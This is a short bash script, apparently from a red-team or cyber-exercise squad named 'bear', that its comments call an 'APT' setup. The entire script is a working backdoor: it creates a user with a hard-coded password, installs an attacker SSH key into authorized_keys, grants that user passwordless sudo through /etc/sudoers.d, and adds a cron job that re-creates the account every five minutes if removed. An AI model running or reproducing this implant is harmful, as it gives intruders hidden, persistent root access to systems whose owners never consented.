#!/bin/bash
# Squad: bear
# Purpose: Create our APT by adding access, privilege escalation, and persistence

# Create a user for the squad
useradd -m bear
echo "bear:SuperSecureP@ss!" | chpasswd

# Add SSH key for persistent access (Access vector)
mkdir -p /home/bear/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDHVU055/vFUYvRuwPO2nIvqXmCEVIcCgU2QbIoH+FYJQB4dtK4yrQPO+FYiTr0qfDkGs0aUdP/IjYngVtmXaQ0zz65AJlaS3athFExnmTv/El6xE00SByxJPuDv/zPJk5t3NMPQaJ5F64CQng8+CQ1tTgcvl+9Afu3UL/6EuJN1g4wS1QnhUL2bd6Vk8oJkVS26FsrZjqVqGH2e33Rmuw4iTc/WnCP1sme3MiyBHxHCPowTOJdG11KF+91VfbLpv2dO6Ns0TAQM2hD66Ds7ah9ban1AzouhurIMjqixB0SbRleBCyW7fE6sK/yqsVuPDii9UknjP6lk9UXJFi1QGrQZbgxdoEkAUQrJTOqYnYjac9ygRWDJ0nljUtQOOatWLAUIljRePNvCVsxbgZQUMzK+Rf9IDJDdD3d3lJO0jg5xt5cZr4k1JPiPE2YSCQGd9fEcpMk707w4yc7v70q2s/jTrXxs30gZlVVQpcy2Zk8XZZYebcbJJVrOaLmqJgAUsmaU1Q8z8o9duxPy0/LAszoLWTyWGAsqi7TT3Hfqw3ARCKnosp/D8XKIlmOFCm/jGCDT7rSYPmgIJA0TU60xZmaOcG8aE7xLveCEDuBZgQryvUX1n/zYVr5Me7Qyxhb5s2hnyJcGblnSTdRLwfA47MG4kO+OMjiqI6ENwOwkdhL7w== brady@LAPTOP-MFD35GEA" > /home/bear/.ssh/authorized_keys
chmod 700 /home/bear/.ssh
chmod 600 /home/bear/.ssh/authorized_keys
chown -R bear:bear /home/bear/.ssh

# Add sudo with no password (Escalation method)
echo "bear ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/bear
chmod 440 /etc/sudoers.d/bear

# Persistence: Cron job to recreate user if removed
(crontab -l 2>/dev/null; echo "*/5 * * * * id bear >/dev/null 2>&1 || (useradd -m bear && echo 'bear:SuperSecureP@ss!' | chpasswd)") | crontab -
